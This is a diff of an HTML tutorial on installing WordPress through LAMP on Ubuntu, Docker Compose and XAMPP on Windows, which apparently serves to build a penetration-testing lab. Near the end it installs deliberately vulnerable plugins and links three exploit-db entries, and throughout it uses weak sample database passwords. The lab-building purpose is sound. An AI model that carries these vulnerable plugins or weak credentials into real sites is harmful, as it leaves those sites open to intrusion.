+<h3>New password:&nbsp;<strong>Enter password</strong></h3>
+</li>
+<li>
+<h3>Re-enter new password:&nbsp;<strong>Repeat password</strong></h3>
+</li>
+<li>
+<h3>Remove anonymous users? [Y/n]:&nbsp;<strong>Y</strong></h3>
+</li>
+<li>
+<h3>Disallow root login remotely? [Y/n]:&nbsp;<strong>Y</strong></h3>
+</li>
+<li>
+<h3>Remove test database and access to it? [Y/n]:&nbsp;<strong>Y</strong></h3>
+</li>
+<li>
+<h3>Reload privilege tables now? [Y/n]:&nbsp;<strong>Y</strong></h3>
+</li>
+</ul>
 <div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-cbFNKx1J4d4/XwoMsgNP_VI/AAAAAAAAlsI/0Ub4eOr5pZAuOM5p3epLR2UAjulRLCJWQCLcBGAsYHQ/s1600/23.png" alt="" data-proportion="true" data-align="none" data-index="51" data-file-name="23.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-xWteHpMYj1M/XwoKAXHaOKI/AAAAAAAAlpw/LtgzxFZ6RdAG2kfXJGFn3LsM5PhNmyMUACLcBGAsYHQ/s1600/3.png" alt="" data-proportion="true" data-align="none" data-index="32" data-file-name="3.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
-<p>You will get the dashboard where you can write your content that to be posted on the website. But here we need to make some changes inside the&nbsp;<strong>setting</strong>&nbsp;so that the wordpress after installation it will work properly. Thus, enter your localhost IP address with a port number on which your docker image is running.</p>
-
+<h3>&nbsp;</h3>
+<h3><strong>Install php</strong></h3>
+<h3>And at last, install the php php-MySQL and run the following command to install this application.</h3>
+<h3>apt install php php-mysql</h3>
+<div class="se-component se-image-container __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-K6HkQRox_R8/XwoKIbQKfKI/AAAAAAAAlp8/YdUyE_KY7hw6LLlS0t9VWzkfju0YPKVXQCLcBGAsYHQ/s1600/4.png" alt="" data-proportion="true" data-align="none" data-index="33" data-file-name="4.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3><strong>Create a Database for WordPress</strong></h3>
+<h3>To access the MySQL, enter the following command which will create a database for wordpress.</h3>
+<h3>mysql -u root -p<br /> CREATE DATABASE wordpress;<br /> CREATE USER 'wp_user'@'localhost' IDENTIFIED BY 'password';<br /> GRANT ALL ON wordpress.* TO 'wp_user'@'localhost' IDENTIFIED BY 'password';<br /> FLUSH PRIVILEGES;<br /> exit</h3>
+<div class="se-component se-image-container __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-LTeAsFaNUKI/XwoKSDwLPvI/AAAAAAAAlqE/PnU2lHvLTTMOc3YodpATQ0EXlK3vhh5_wCLcBGAsYHQ/s1600/5.png" alt="" data-proportion="true" data-align="none" data-index="34" data-file-name="5.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3><strong>WordPress Installation &amp; Configuration</strong></h3>
+<h3>Now, its time to download and install the WordPress on our localhost, with the help of wget command we have fetched the compressed file of wordpress setup and extract the folder inside the /var/www/html directory.</h3>
+<h3>cd /var/www/html<br /> wget http://www.wordpress.org/latest.tar.gz<br /> tar &ndash;xvf latest.tar.gz</h3>
+<div class="se-component se-image-container __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-_qeCCuKUyQE/XwoKcMQrP1I/AAAAAAAAlqM/PkNf8osoyigGQ7phZMkYwpgYVeeOgGvaQCLcBGAsYHQ/s1600/6.png" alt="" data-proportion="true" data-align="none" data-index="35" data-file-name="6.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>Then run the given command to change ownership of &lsquo;wordpress&rsquo; directory as well permission for upload directory.</h3>
+<h3>chown -R www-data:www-data wordpress/<br /> chmod -R 755&nbsp; wordpress/<br /> mkdir wordpress/wp-content/uploads<br /> chown -R&nbsp; www-data:www-data wordpress/wp-content/uploads</h3>
+<div class="se-component se-image-container __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-wU3V5X1YKEQ/XwoKjKbg6cI/AAAAAAAAlqU/8PLtp7CXB94JRbwvvtwMu5vIlP1ZsMKdgCLcBGAsYHQ/s1600/7.png" alt="" data-proportion="true" data-align="none" data-index="36" data-file-name="7.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>Now, till here we are done with the installation, to create a WordPress website we need to access the application over web browser on localhost by executing following and then complete the remaining installation process.</h3>
+<h3>http://localhost/wordpress/</h3>
+<h3>This will open the setup file and ask to choose your preferred language. I select&nbsp;<strong>English</strong>&nbsp;and then press the&nbsp;<strong>continue&nbsp;</strong>Tab.</h3>
 <div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-O25DkOyxnX0/XwoM2P0va5I/AAAAAAAAlsQ/z1IUD_kD8coG9Fr58wA0u5q_3ExvffatQCLcBGAsYHQ/s1600/24.png" alt="" data-proportion="true" data-align="none" data-index="52" data-file-name="24.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-vBLntI2O0lQ/XwoKsDqkfSI/AAAAAAAAlqc/fhEBknFNwkAOV3NkvxudQDSIafAOrFdoACLcBGAsYHQ/s1600/8.png" alt="" data-proportion="true" data-align="none" data-index="37" data-file-name="8.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
-<p>And Finally, it is over here, and your WordPress is completely ready to go but over port 8000 as shown here 😊.</p>
-
+<h3>&nbsp;</h3>
+<h3>Read the given content and press Let&rsquo;s go to continue the activity.</h3>
 <div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-JkL2fzXsaTo/XwoM9_S4j0I/AAAAAAAAlsY/u_sv_yeL-fQB_7sgKM43jrTn53r-wM6dwCLcBGAsYHQ/s1600/25.png" alt="" data-proportion="true" data-align="none" data-index="53" data-file-name="25.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-9-6OHy7vnM8/XwoKzLQiPtI/AAAAAAAAlqk/T-x5mCR7LKE7k2TnDOvtP0SSwhByA5uQgCLcBGAsYHQ/s1600/9.png" alt="" data-proportion="true" data-align="none" data-index="38" data-file-name="9.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
+<h3>&nbsp;</h3>
+<h3>To continue the activity, we need to enter the required details that will help the application to connect with database, thus it should be the same information that we have entered above at the time of database we have created for WordPress.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-gylfROhBBd0/XwoK5yElFlI/AAAAAAAAlqo/5WM0xDfAdmYqqttDyt4lmCdXRJBryEpuQCLcBGAsYHQ/s1600/10.png" alt="" data-proportion="true" data-align="none" data-index="39" data-file-name="10.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>And if your above-given detail is correct, you will get the Installation page as we have here.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-BIoFBnCO9Co/XwoLCs-eveI/AAAAAAAAlqw/1v-1yx1ARZgzrUqjXFObHcUTW1ASSnqQgCLcBGAsYHQ/s1600/11.png" alt="" data-proportion="true" data-align="none" data-index="40" data-file-name="11.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>Now after that, it will ask you enter details for your Website which you want to host using WordPress CMS as shown in the below image and then finally click on install Tab.</h3>
+<h3><strong>Note</strong>: The User and Password asked before the installation is referred to your Database information, and the username and password asked after installed are referred to your application (CMS).</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-LjY6s1HwOtA/XwoLPPBjOgI/AAAAAAAAlq4/Jk_Kdses-5Ao5F8cY8WVWj9b1rgeHP9BACLcBGAsYHQ/s1600/12.png" alt="" data-proportion="true" data-align="none" data-index="41" data-file-name="12.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>And once it is done, you will get application login page where you have to enter credential to access the dashboard of your CMS.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-6hMjkcDRaGs/XwoLWp-8AGI/AAAAAAAAlrA/8HPZXQd8nB8yNfyJSkvAB8VgNgVs1FOCgCLcBGAsYHQ/s1600/13.png" alt="" data-proportion="true" data-align="none" data-index="42" data-file-name="13.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>You will get the dashboard where you can write your content that to be posted on the website.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-QIsbpYfkjPE/XwoLlQ5keNI/AAAAAAAAlrI/kDmJd3vhNXUqLV9wYf8bBYgqtdT9WZohQCLcBGAsYHQ/s1600/14.png" alt="" data-proportion="true" data-align="none" data-index="43" data-file-name="14.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>Open the wp-config.php file in wordpress directory and paste the following lines in it to access the website page.</h3>
+<h3>define( 'WP_SITEURL', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');<br /> define( 'WP_HOME', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');</h3>
+<div class="se-component se-image-container __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-V0pG032HJ8I/XwoLtYAoBsI/AAAAAAAAlrQ/vsdaMETR6YIn4SjzGKDUyWbEO8gauC0MACLcBGAsYHQ/s1600/16.png" alt="" data-proportion="true" data-align="none" data-index="44" data-file-name="16.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>And Finally, it is over here, and your WordPress is completely ready to go😊.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-PzSRtdHUUWE/XwoL3A0vjOI/AAAAAAAAlrY/bp5wxWGx3_Mmm8zG4OyidTqKmkRMN5mGACLcBGAsYHQ/s1600/17.png" alt="" data-proportion="true" data-align="none" data-index="45" data-file-name="17.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>Install WordPress using Docker</h3>
+<h3>Install WordPress through docker will release your effort of installing prerequisites for WordPress setup. It is a very easy and quick technique to configured WordPress. All you need to have some basic knowledge of Docker and its functionalities.</h3>
+<h3>To install wordpress using docker, first, we will update the Ubuntu repository and then install the latest version of docker.io. Let&rsquo;s start the installation of docker packages with the apt command as below:</h3>
+<h3>apt install docker.io</h3>
+<div class="se-component se-image-container __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-3VOY8uQJaGo/XwoL-Of1WJI/AAAAAAAAlrg/X8hGjIz8v6kKOl3v00aznptHAjvSeLx7gCLcBGAsYHQ/s1600/18.png" alt="" data-proportion="true" data-align="none" data-index="46" data-file-name="18.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>Docker Compose is used to run multiple containers as a single service. Let&rsquo;s begin the installation of docker-compose with the help of apt by entering the following command.</h3>
+<h3>apt install docker-compose</h3>
+<div class="se-component se-image-container __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-TAHd1yxg2OU/XwoMGLpfBpI/AAAAAAAAlrk/YUtGWp6ku8MFcUpfpLmNIKIKOnl91iW-QCLcBGAsYHQ/s1600/19.png" alt="" data-proportion="true" data-align="none" data-index="47" data-file-name="19.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>After installing the composer for the Docker, we must create a directory by the name of WordPress.&nbsp;After creating the directory, we will create a .yml file that will contain the service definitions for your setup.</h3>
+<h3>mkdir wordpress<br /> cd wordpress/<br /> nano docker-compose.yml</h3>
+<div class="se-component se-image-container __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-ct7BZnAfd44/XwoMN0T-dpI/AAAAAAAAlrw/_3wQ87O5rj8YpOFm1P6-QFLSKJRqdvPkACLcBGAsYHQ/s1600/20.png" alt="" data-proportion="true" data-align="none" data-index="48" data-file-name="20.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>Now Paste the following text in the .yml and save the configuration. Source Code From&nbsp;<strong>here</strong>&nbsp;-&nbsp;https://docs.docker.com/compose/wordpress/</h3>
+<h3>version: '3.3'<br /> <br /> services:<br /> db:<br /> image: mysql:5.7<br /> volumes:<br /> - db_data:/var/lib/mysql<br /> restart: always<br /> environment:<br /> MYSQL_ROOT_PASSWORD: somewordpress<br /> MYSQL_DATABASE: wordpress<br /> MYSQL_USER: wordpress<br /> MYSQL_PASSWORD: wordpress<br /> <br /> wordpress:<br /> depends_on:<br /> - db<br /> image: wordpress:latest<br /> ports:<br /> - "8000:80"<br /> restart: always<br /> environment:<br /> WORDPRESS_DB_HOST: db:3306<br /> WORDPRESS_DB_USER: wordpress<br /> WORDPRESS_DB_PASSWORD: wordpress<br /> WORDPRESS_DB_NAME: wordpress<br /> volumes:<br /> db_data: {}</h3>
+<div class="se-component se-image-container __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-d8ztuPUt5N8/XwoMZ9c5okI/AAAAAAAAlr4/xG2FcL7ZP0gr4N-BWFQSowqhl7f6Z75XgCLcBGAsYHQ/s1600/21.png" alt="" data-proportion="true" data-align="none" data-index="49" data-file-name="21.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>Now run the docker image in detach mode using the following command</h3>
+<h3>docker&ndash;compose up -d</h3>
+<div class="se-component se-image-container __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-FISJDxSierg/XwoMhXPsa6I/AAAAAAAAlsA/oga-oVoPxrUXWB_t9KYRK0xUmqPn7UBeQCLcBGAsYHQ/s1600/22.png" alt="" data-proportion="true" data-align="none" data-index="50" data-file-name="22.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>After doing all the configuration step-by-step, now access the localhost on port 8000 that will be hosting your WordPress Docker image and configure your WordPress site as done in the previous section.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-cbFNKx1J4d4/XwoMsgNP_VI/AAAAAAAAlsI/0Ub4eOr5pZAuOM5p3epLR2UAjulRLCJWQCLcBGAsYHQ/s1600/23.png" alt="" data-proportion="true" data-align="none" data-index="51" data-file-name="23.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>You will get the dashboard where you can write your content that to be posted on the website. But here we need to make some changes inside the&nbsp;<strong>setting</strong>&nbsp;so that the wordpress after installation it will work properly. Thus, enter your localhost IP address with a port number on which your docker image is running.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-O25DkOyxnX0/XwoM2P0va5I/AAAAAAAAlsQ/z1IUD_kD8coG9Fr58wA0u5q_3ExvffatQCLcBGAsYHQ/s1600/24.png" alt="" data-proportion="true" data-align="none" data-index="52" data-file-name="24.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>And Finally, it is over here, and your WordPress is completely ready to go but over port 8000 as shown here 😊.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-JkL2fzXsaTo/XwoM9_S4j0I/AAAAAAAAlsY/u_sv_yeL-fQB_7sgKM43jrTn53r-wM6dwCLcBGAsYHQ/s1600/25.png" alt="" data-proportion="true" data-align="none" data-index="53" data-file-name="25.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
 <h3><strong>Install WordPress on Windows Platform</strong></h3>
-
-<p>Installation of WordPress is also very easy as compared to ubuntu because to fulfil the prerequisites of LAMP Server we can use XAMPP that will complete the all required dependency like apache and MySQL for WordPress.</p>
-
+<h3>Installation of WordPress is also very easy as compared to ubuntu because to fulfil the prerequisites of LAMP Server we can use XAMPP that will complete the all required dependency like apache and MySQL for WordPress.</h3>
 <div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-jNn_ESRuqt8/XwoNOABDlwI/AAAAAAAAlsk/hkD9wut4PBERn3vtvpxi5oaeKJm0MgKbACLcBGAsYHQ/s1600/50.png" alt="" data-proportion="true" data-align="none" data-index="54" data-file-name="50.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-jNn_ESRuqt8/XwoNOABDlwI/AAAAAAAAlsk/hkD9wut4PBERn3vtvpxi5oaeKJm0MgKbACLcBGAsYHQ/s1600/50.png" alt="" data-proportion="true" data-align="none" data-index="54" data-file-name="50.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
-<p>Now download the extract the zip file of WordPress inside the /htdocs folder in /xampp folder in C-Drive.</p>
-
+<h3>&nbsp;</h3>
+<h3>Now download the extract the zip file of WordPress inside the /htdocs folder in /xampp folder in C-Drive.</h3>
 <div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-A9T1WAnNG-M/XwoNUy1zZNI/AAAAAAAAlso/IQDUjscgYg0DS4TVrtZwAnRvA2YV7WbYACLcBGAsYHQ/s1600/51.png" alt="" data-proportion="true" data-align="none" data-index="55" data-file-name="51.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-A9T1WAnNG-M/XwoNUy1zZNI/AAAAAAAAlso/IQDUjscgYg0DS4TVrtZwAnRvA2YV7WbYACLcBGAsYHQ/s1600/51.png" alt="" data-proportion="true" data-align="none" data-index="55" data-file-name="51.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
-<p>Now open the PHPMYADMIN in a web browser by accessing /localhost/phpMyAdmin and create the database for WordPress to store its data.</p>
-
+<h3>&nbsp;</h3>
+<h3>Now open the PHPMYADMIN in a web browser by accessing /localhost/phpMyAdmin and create the database for WordPress to store its data.</h3>
 <div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-tPUZcT8ECHY/XwoNdCXRGQI/AAAAAAAAlss/JOE2h5RBZjIXtpiv5mlL3b5jbaHQNxyZwCLcBGAsYHQ/s1600/52.png" alt="" data-proportion="true" data-align="none" data-index="56" data-file-name="52.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-tPUZcT8ECHY/XwoNdCXRGQI/AAAAAAAAlss/JOE2h5RBZjIXtpiv5mlL3b5jbaHQNxyZwCLcBGAsYHQ/s1600/52.png" alt="" data-proportion="true" data-align="none" data-index="56" data-file-name="52.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
-<p>Now in order to configure wordpress, explore the /localhost/wordpress/ and then enter the detail for the database.</p>
-
-<p><strong>Note:</strong>&nbsp;By Default, XAMPP DB_User is root and DB_Pass is empty &lt;blank&gt;</p>
-
-<p>So as per XMAPP database configuration, we entered the following details in the given record.</p>
-
+<h3>&nbsp;</h3>
+<h3>Now in order to configure wordpress, explore the /localhost/wordpress/ and then enter the detail for the database.</h3>
+<h3><strong>Note:</strong>&nbsp;By Default, XAMPP DB_User is root and DB_Pass is empty &lt;blank&gt;</h3>
+<h3>So as per XMAPP database configuration, we entered the following details in the given record.</h3>
 <div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-I5mP2py3cSo/XwoNlh7GFkI/AAAAAAAAls4/vTgwIYdXdMon0oxNthgTl-65CcXJQYOLACLcBGAsYHQ/s1600/53.png" alt="" data-proportion="true" data-align="none" data-index="57" data-file-name="53.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-I5mP2py3cSo/XwoNlh7GFkI/AAAAAAAAls4/vTgwIYdXdMon0oxNthgTl-65CcXJQYOLACLcBGAsYHQ/s1600/53.png" alt="" data-proportion="true" data-align="none" data-index="57" data-file-name="53.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
-<p>Now again repeat the same step as done in the above section.</p>
-
+<h3>&nbsp;</h3>
+<h3>Now again repeat the same step as done in the above section.</h3>
 <div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-gN6GHkug9LU/XwoNxIOLW1I/AAAAAAAAls8/HkvA5KjJJ0s47GLtKxcFcV8DX9ee4wapwCLcBGAsYHQ/s1600/54.png" alt="" data-proportion="true" data-align="none" data-index="58" data-file-name="54.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-gN6GHkug9LU/XwoNxIOLW1I/AAAAAAAAls8/HkvA5KjJJ0s47GLtKxcFcV8DX9ee4wapwCLcBGAsYHQ/s1600/54.png" alt="" data-proportion="true" data-align="none" data-index="58" data-file-name="54.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
-<p>You will get the dashboard where you can write your content that to be posted on the website.</p>
-
+<h3>&nbsp;</h3>
+<h3>You will get the dashboard where you can write your content that to be posted on the website.</h3>
 <div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-iqOvDjrLiLY/XwoN71RgwAI/AAAAAAAAltA/UbKKPCYz4jI_r5CwwgG-s635tTuY9S96gCLcBGAsYHQ/s1600/55.png" alt="" data-proportion="true" data-align="none" data-index="59" data-file-name="55.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-iqOvDjrLiLY/XwoN71RgwAI/AAAAAAAAltA/UbKKPCYz4jI_r5CwwgG-s635tTuY9S96gCLcBGAsYHQ/s1600/55.png" alt="" data-proportion="true" data-align="none" data-index="59" data-file-name="55.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
-<p>To make it vulnerable WordPress platform in order to perform penetration testing I have installed some vulnerable plugin as highlighted in the image.</p>
-
-<p><strong>WordPress Vulnerable Plugin</strong></p>
-
-<p><strong>https://www.exploit-db.com/exploits/40290</strong></p>
-
-<p><strong>https://www.exploit-db.com/exploits/36374</strong></p>
-
-<p><strong>https://www.exploit-db.com/exploits/44883</strong></p>
-
+<h3>&nbsp;</h3>
+<h3>To make it vulnerable WordPress platform in order to perform penetration testing I have installed some vulnerable plugin as highlighted in the image.</h3>
+<h3><strong>WordPress Vulnerable Plugin</strong></h3>
+<h3><strong>https://www.exploit-db.com/exploits/40290</strong></h3>
+<h3><strong>https://www.exploit-db.com/exploits/36374</strong></h3>
+<h3><strong>https://www.exploit-db.com/exploits/44883</strong></h3>
 <div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-mhZvutqaUmA/XwoODNfWrPI/AAAAAAAAltI/azoEcjSmZSwd6oq2cLPqPM0Q0jOhjfyTgCLcBGAsYHQ/s1600/56.png" alt="" data-proportion="true" data-align="none" data-index="60" data-file-name="56.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-mhZvutqaUmA/XwoODNfWrPI/AAAAAAAAltI/azoEcjSmZSwd6oq2cLPqPM0Q0jOhjfyTgCLcBGAsYHQ/s1600/56.png" alt="" data-proportion="true" data-align="none" data-index="60" data-file-name="56.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
-<p>&nbsp;</p>
-
-<p><br>
-</p>
+<h3>&nbsp;</h3>
+<h3>&nbsp;</h3>
+<h3>&nbsp;</h3>
